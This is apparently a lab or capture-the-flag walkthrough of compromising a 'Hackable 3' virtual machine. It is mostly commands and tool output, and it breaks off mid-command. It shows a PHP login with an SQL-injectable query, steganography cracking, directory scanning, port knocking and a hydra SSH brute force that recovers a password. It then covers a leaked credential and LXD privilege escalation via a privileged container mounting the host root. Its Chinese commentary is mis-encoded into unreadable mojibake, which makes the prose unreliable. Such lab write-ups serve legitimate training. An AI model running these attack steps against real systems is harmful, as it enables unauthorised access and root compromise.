<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$usuario</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$senha</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot; SELECT * FROM usuarios WHERE user = &#x27;&#123;$usuario&#125;&#x27; and pass = &#x27;&#123;$senha&#125;&#x27;&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conexao</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = mysqli_num_rows(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#validaè½èŒ«o conta</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> == <span class="number">1</span>) &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;usuario&#x27;</span>] = <span class="variable">$usuario</span>;</span><br><span class="line">	header(<span class="string">&#x27;Location: 3.jpg&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;nao_autenticado&#x27;</span>] = true;</span><br><span class="line">	header(<span class="string">&#x27;Location: login_page/login.html&#x27;</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®ä»£ç å»&#x2F;login_page&#x2F;login.htmlè·¯å¾„ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ç”¨åˆšæ‰config.phpä¸­çš„ä»£ç çŸ¥é“ç”¨æˆ·åæ˜¯rootï¼Œå¯†ç ä¸ºç©º<br>ä½†æ˜¯è¿™æ ·å­ç™»å½•ä¹‹ååˆç»™æˆ‘è¿”å›phpæºä»£ç éƒ¨åˆ†<br>çœ‹è¿™ä¸ªä»£ç ç™»å½•æˆåŠŸä¹Ÿæ˜¯ç»™æˆ‘å®šä½åˆ°3.jpgé‡Œé¢äº†ã€‚é‚£æˆ‘ç›´æ¥è·å–è¿™ä¸ª3.jpgç„¶åç”¨stegseekç ´è§£ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROLOG"><figure class="iseeu highlight /prolog"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# stegseek -wl /usr/share/wordlists/rockyou.txt <span class="number">3.</span>jpg         </span><br><span class="line"><span class="symbol">StegSeek</span> <span class="number">0.6</span> - https://github.com/<span class="symbol">RickdeJager</span>/<span class="symbol">StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Found</span> passphrase: <span class="string">&quot;&quot;</span></span><br><span class="line">[i] <span class="symbol">Original</span> filename: <span class="string">&quot;steganopayload148505.txt&quot;</span>.</span><br><span class="line">[i] <span class="symbol">Extracting</span> to <span class="string">&quot;3.jpg.out&quot;</span>.</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ° porta:65535  å°è¯•ç”¨è¿™ä¸¤ä¸ªç«¯å£knockäº†ä¸€ä¸‹è¿˜æ˜¯ä¸è¡Œ<br>é‚£å°±è¯´æ˜æˆ‘ä»¬ä¿¡æ¯è·å–è¿˜ä¸è¿‡ï¼Œæ‰€ä»¥ç»§ç»­ç”¨åˆ«çš„æ‰«æå™¨è¯•è¯•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u 192.168.179.164</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output <span class="params">File:</span> <span class="symbol">/root/tmp/reports/_192.168.179.164/_25-02-11_17-49-38.txt</span></span><br><span class="line"></span><br><span class="line"><span class="params">Target:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">38</span>] <span class="params">Starting:</span> </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">38</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">315</span>B  <span class="operator">-</span> <span class="symbol">/js</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>js<span class="symbol">/</span>               </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.ht_wsr.txt</span>                                      </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.bak1</span>                                   </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.sample</span>                                 </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.orig</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess.save</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_orig</span>                                   </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_extra</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessBAK</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccess_sc</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD2</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htaccessOLD</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htm</span>                                             </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.html</span>                                            </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswds</span>                                       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.htpasswd_test</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">39</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/.httr-oauth</span>                                      </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">42</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/backup</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>backup<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">42</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">460</span>B  <span class="operator">-</span> <span class="operator">/</span>backup<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">319</span>B  <span class="operator">-</span> <span class="symbol">/config</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>config<span class="symbol">/</span>       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">507</span>B  <span class="operator">-</span> <span class="symbol">/config.php</span>                                       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">452</span>B  <span class="operator">-</span> <span class="operator">/</span>config<span class="symbol">/</span>                                          </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">43</span>] <span class="number">301</span> <span class="operator">-</span>  <span class="number">316</span>B  <span class="operator">-</span> <span class="symbol">/css</span>  <span class="operator">-&gt;</span>  http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">179.164</span><span class="operator">/</span>css<span class="symbol">/</span>             </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">45</span>] <span class="number">200</span> <span class="operator">-</span>    <span class="number">3</span>KB <span class="operator">-</span> <span class="symbol">/home.html</span>                                        </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">45</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">456</span>B  <span class="operator">-</span> <span class="operator">/</span>js<span class="symbol">/</span>                                              </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">46</span>] <span class="number">200</span> <span class="operator">-</span>  <span class="number">487</span>B  <span class="operator">-</span> <span class="symbol">/login.php</span>                                        </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">49</span>] <span class="number">200</span> <span class="operator">-</span>   <span class="number">33</span>B  <span class="operator">-</span> <span class="symbol">/robots.txt</span>                                       </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">49</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">[<span class="number">17</span>:<span class="number">49</span>:<span class="number">49</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">280</span>B  <span class="operator">-</span> <span class="operator">/</span>server-status<span class="symbol">/</span>                                   </span><br></pre></td></tr></table></figure></div>
<p>è¿˜çœŸæ‰«å‡ºæ¥äº†å…¶ä»–ç›®å½•ï¼Œè®¿é—®backupç›®å½•ï¼Œå¾—åˆ°ä¸€ä¸ªwordlistæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯ç”¨æ¥çˆ†ç ´çš„<br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªcssç›®å½•ä¹Ÿæ˜¯å¤šçº§ç›®å½•ï¼Œè®¿é—®ä¹‹åä¹Ÿå¯ä»¥çœ‹åˆ°æ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ªbrainfuckåŠ å¯†çš„å¯†æ–‡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BRAINFUCK"><figure class="iseeu highlight /brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">â”Œâ”€â”€(rootã‰¿kakeru)</span><span class="literal">-</span><span class="title">[</span><span class="comment">~/tmp</span><span class="title">]</span></span><br><span class="line"><span class="comment">â””â”€# curl http://192</span><span class="string">.</span><span class="comment">168</span><span class="string">.</span><span class="comment">179</span><span class="string">.</span><span class="comment">164/css/2</span><span class="string">.</span><span class="comment">txt</span></span><br><span class="line"><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;<span class="literal">------------------</span><span class="string">.</span><span class="string">.</span><span class="string">.</span><span class="string">.</span> </span><br></pre></td></tr></table></figure></div>
<p>éšä¾¿æ‰¾ä¸€ä¸ªåœ¨çº¿è§£å¯†ç½‘ç«™å¾—åˆ°4444<br>ç„¶åå°†4444 10000 65535 å°è¯•ä¸åŒé¡ºåºknockæœ€åè®©22ç«¯å£å¼€æ”¾</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap  192.168.179.164</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">04</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span>)</span><br><span class="line">Host is up (<span class="number">0.00040</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: <span class="number">2</span>A:A3:<span class="number">5</span>A:<span class="number">42</span>:<span class="number">17</span>:<span class="number">24</span> (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.29</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
<p>æ¥ä¸‹æ¥å°±æ˜¯ç”¨åˆšæ‰å¾—åˆ°çš„ç”¨æˆ·åå’Œwordlistçˆ†ç ´sshäº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# hydra -l jubiscleudo -P pass.txt ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">07</span>:<span class="number">33</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Many SSH configurations <span class="keyword">limit</span> the number <span class="keyword">of</span> parallel tasks, it <span class="keyword">is</span> recommended <span class="keyword">to</span> reduce the tasks: use -t <span class="number">4</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">300</span> <span class="keyword">login</span> tries (l:<span class="number">1</span>/p:<span class="number">300</span>), ~<span class="number">19</span> tries per task</span><br><span class="line">[DATA] attacking ssh://<span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span>:<span class="number">22</span>/</span><br><span class="line">[<span class="number">22</span>][ssh] host: <span class="number">192.168</span><span class="number">.179</span><span class="number">.164</span>   <span class="keyword">login</span>: jubiscleudo   <span class="keyword">password</span>: onlymy</span><br><span class="line">[STATUS] <span class="number">300.00</span> tries/min, <span class="number">300</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">5</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">7</span> active</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Writing restore file because <span class="number">5</span> final worker threads did <span class="keyword">not</span> complete <span class="keyword">until</span> <span class="keyword">end</span>.</span><br><span class="line">[ERROR] <span class="number">5</span> targets did <span class="keyword">not</span> resolve <span class="keyword">or</span> could <span class="keyword">not</span> be connected</span><br><span class="line">[ERROR] <span class="number">0</span> target did <span class="keyword">not</span> complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-11</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">36</span></span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸæ‹¿åˆ°shell jubiscleudo&#x2F;onlymy<br>è¿™é‡Œè¿˜æœ‰ä¸€ç§å¯ä»¥ç”¨ipv6ç»•è¿‡knockçš„æ–¹æ³•ï¼Œè¯¦æƒ…å¯ä»¥çœ‹ç¾¤ä¸»ll104567çš„è§†é¢‘<a href="https://space.bilibili.com/20805349?spm_id_from=333.1387.follow.user_card.click">https://space.bilibili.com/20805349?spm_id_from=333.1387.follow.user_card.click</a></p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>ç”¨linpeas.shæ¥æ‰¾æ‰¾æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„<br>å‘ç°äº†åœ¨&#x2F;var&#x2F;www&#x2F;html&#x2F;.backup_config.phpé‡Œæœ‰hackable_3ç”¨æˆ·çš„å¯†ç <br><img src="https://pic1.imgdb.cn/item/67ab377ad0e0a243d4fe613a.png"><br>åˆ‡æ¢ç”¨æˆ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hackable_3</span>@ubuntu20:~$ id</span><br><span class="line"><span class="attribute">uid</span>=<span class="number">1000</span>(hackable_3) gid=<span class="number">1000</span>(hackable_3) groups=<span class="number">1000</span>(hackable_3),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">116</span>(lxd)</span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®ç¾¤ä¸»åœ¨ç¾¤é‡Œå‘çš„æ–‡ä»¶çŸ¥é“lxdæ˜¯å¯ä»¥ææƒçš„<br>LXD æ˜¯ä¸€ä¸ª root è¿›ç¨‹ï¼Œå®ƒè´Ÿè´£æ‰§è¡Œä»»æ„ç”¨æˆ·çš„ LXD UNIX å¥—æ¥å­—å†™å…¥è®¿é—®æ“ä½œã€‚è€Œä¸”åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒLXD ç”šè‡³éƒ½ä¸ä¼šè°ƒç”¨å®ƒçš„ç”¨æˆ·æƒé™è¿›è¡Œæ£€æŸ¥å’ŒåŒ¹é…</p>
<p>Linux Containerï¼ˆLXCï¼‰é€šå¸¸è¢«è®¤ä¸ºæ˜¯ä¸€ç§è½»é‡çº§è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå®ƒä»‹äº Chroot å’Œå®Œæ•´å¼€å‘çš„è™šæ‹Ÿæœºä¹‹é—´ï¼ŒLXC å¯ä»¥åˆ›å»ºä¸€ä¸ªè·Ÿæ­£å¸¸ Linux æ“ä½œç³»ç»Ÿååˆ†æ¥è¿‘çš„ç¯å¢ƒï¼Œä½†æ˜¯ä¸éœ€è¦ä½¿ç”¨åˆ°å•ç‹¬çš„å†…æ ¸èµ„æºã€‚</p>
<p>Linux Daemonï¼ˆLXDï¼‰æ˜¯ä¸€ä¸ªè½»é‡çº§å®¹å™¨ç®¡ç†ç¨‹åºï¼Œè€Œ LXD æ˜¯åŸºäº LXC å®¹å™¨æŠ€æœ¯å®ç°çš„ï¼Œè€Œè¿™ç§æŠ€æœ¯ä¹‹å‰ Docker ä¹Ÿä½¿ç”¨è¿‡ã€‚LXD ä½¿ç”¨äº†ç¨³å®šçš„ LXC API æ¥å®Œæˆæ‰€æœ‰çš„åå°å®¹å™¨ç®¡ç†å·¥ä½œï¼Œå¹¶ä¸”å¢åŠ äº† REST API æ”¯æŒï¼Œæ›´è¿›ä¸€æ­¥åœ°æå‡äº†ç”¨æˆ·ä½“éªŒåº¦ã€‚</p>
<p>åœ¨ç½‘ä¸Šæœlxdææƒ<br>å…ˆä¸‹è½½åˆ©ç”¨çš„ç¨‹åº <a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a><br>ç„¶åå¼€http_serveræœåŠ¡è®©é¶æœºç”¨wgetèƒ½æ¥å—</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~]</span><br><span class="line">â””â”€<span class="comment"># scp kakeru@192.168.179.82:Downloads/lxd-alpine-builder-master.zip .</span></span><br><span class="line">(kakeru@<span class="number">192.168</span>.<span class="number">179.82</span>) <span class="params">Password:</span></span><br><span class="line">lxd-alpine-builder-master.zip                                                    <span class="number">100</span>% <span class="number">3175</span>KB <span class="number">116.0</span>MB<span class="symbol">/s</span>   <span class="number">00</span>:<span class="number">00</span>    </span><br><span class="line">                              </span><br></pre></td></tr></table></figure></div>
<p>è·Ÿç€ç½‘ä¸Šlxdææƒçš„æ­¥éª¤<a href="https://www.cnblogs.com/jhinjax/p/17078938.html%EF%BC%8C">https://www.cnblogs.com/jhinjax/p/17078938.htmlï¼Œ</a><br>æ¥å—æ–‡ä»¶åï¼Œåˆå§‹åŒ–ï¼Œä¸€è·¯å›è½¦</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp<span class="operator">/</span>lxd<span class="operator">-</span>alpine<span class="operator">-</span>builder<span class="operator">-</span>master]</span><br><span class="line">â””â”€# python3 <span class="operator">-</span>m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">80</span> (http:<span class="operator">/</span><span class="operator">/</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">80</span><span class="operator">/</span>) ...</span><br><span class="line"></span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ ls</span><br><span class="line">alpine<span class="operator">-</span>v3<span class="number">.13</span><span class="operator">-</span>x86_64<span class="number">-20210218</span>_0139.tar.gz  snap</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxd init</span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> use LXD clustering? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Do you want <span class="keyword">to</span> configure a <span class="keyword">new</span> storage pool? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes]: </span><br><span class="line"></span><br><span class="line">Name <span class="keyword">of</span> the <span class="keyword">new</span> storage pool [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">default</span>]: Name <span class="keyword">of</span> the storage backend <span class="keyword">to</span> use (ceph, btrfs, dir, lvm) [<span class="keyword">default</span><span class="operator">=</span>btrfs]: </span><br><span class="line"><span class="keyword">Create</span> a <span class="keyword">new</span> BTRFS pool? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes]: </span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> use an existing <span class="keyword">empty</span> block device (e.g. a disk <span class="keyword">or</span> <span class="keyword">partition</span>)? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Size <span class="keyword">in</span> GB <span class="keyword">of</span> the <span class="keyword">new</span> loop device (<span class="number">1</span>GB minimum) [<span class="keyword">default</span><span class="operator">=</span><span class="number">5</span>GB]: </span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> <span class="keyword">connect</span> <span class="keyword">to</span> a MAAS server? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Would you <span class="keyword">like</span> <span class="keyword">to</span> <span class="keyword">create</span> a <span class="keyword">new</span> <span class="keyword">local</span> network bridge? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes]: </span><br><span class="line">What should the <span class="keyword">new</span> bridge be <span class="keyword">called</span>? [<span class="keyword">default</span><span class="operator">=</span>lxdbr0]: </span><br><span class="line">What IPv4 address should be used? (CIDR subnet notation, â€œautoâ€ <span class="keyword">or</span> â€œ<span class="keyword">none</span>â€) [<span class="keyword">default</span><span class="operator">=</span>auto]: </span><br><span class="line">What IPv6 address should be used? (CIDR subnet notation, â€œautoâ€ <span class="keyword">or</span> â€œ<span class="keyword">none</span>â€) [<span class="keyword">default</span><span class="operator">=</span>auto]: </span><br><span class="line">Would you <span class="keyword">like</span> the LXD server <span class="keyword">to</span> be available <span class="keyword">over</span> the network? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line">Would you <span class="keyword">like</span> stale cached images <span class="keyword">to</span> be updated automatically? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span>yes] </span><br><span class="line">Would you <span class="keyword">like</span> a YAML &quot;lxd init&quot; preseed <span class="keyword">to</span> be printed? (yes<span class="operator">/</span><span class="keyword">no</span>) [<span class="keyword">default</span><span class="operator">=</span><span class="keyword">no</span>]: </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc image import alpine<span class="operator">-</span>v3<span class="number">.13</span><span class="operator">-</span>x86_64<span class="number">-20210218</span>_0139.tar.gz <span class="comment">--alias  image_name</span></span><br><span class="line">Image imported <span class="keyword">with</span> fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc init image_name ignite <span class="operator">-</span>c security.privileged<span class="operator">=</span><span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">hackable_3<span class="variable">@ubuntu20</span>:<span class="operator">~</span>$ lxc config device <span class="keyword">add</span> ignite mydevice disk source<span class="operator">=</span><span class="operator">/</span> path<span class="operator">=</span><span class="operator">/</span>mnt<span class="operator">/</span>root <span class="keyword">recursive</span><span class="operator">=</span><span 